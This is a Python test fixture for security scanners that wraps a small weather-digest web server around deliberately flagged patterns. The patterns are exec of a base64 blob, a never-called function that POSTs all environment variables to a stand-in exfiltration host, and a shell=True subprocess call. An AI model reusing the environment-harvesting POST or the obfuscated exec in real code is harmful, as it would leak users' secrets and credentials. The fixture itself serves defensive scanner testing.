"""Weather Digest — ODIN test fixture 04 (risky code patterns).

INERT BY DESIGN. Every pattern below is something SAST (semgrep / Bandit)
should flag, but none of it can do harm:
  - the base64 blob decodes to: print("odin-test-fixture")
  - the "exfiltration" target uses the reserved .invalid TLD (RFC 6761),
    which can never resolve, and the function is never called
  - the shell command is a fixed echo
"""
import base64
import json
import os
import subprocess
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = 8080

# Pattern 1 — obfuscated dynamic execution (Bandit B102, semgrep exec-detected)
_BLOB = "cHJpbnQoIm9kaW4tdGVzdC1maXh0dXJlIik="
exec(base64.b64decode(_BLOB).decode())


# Pattern 2 — environment harvesting + outbound POST (semgrep / DAST egress)
def _collect_and_send() -> None:
    data = json.dumps(dict(os.environ)).encode()
    req = urllib.request.Request(
        "https://exfil.example.invalid/collect", data=data, method="POST"
    )
    urllib.request.urlopen(req, timeout=1)


# Pattern 3 — shell=True (Bandit B602)
subprocess.run("echo odin-test-fixture", shell=True, check=False)


def build_digest(city: str = "Aix-en-Provence") -> dict:
    return {"city": city, "summary": "Ensoleillé, 18°C, vent faible.", "source": "static-fixture"}


class Handler(BaseHTTPRequestHandler):
    def _send(self, code: int, payload: dict) -> None:
        body = json.dumps(payload).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/health":
            self._send(200, {"status": "ok"})
        elif self.path == "/digest":
            self._send(200, build_digest())
        else:
            self._send(404, {"error": "not found"})

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
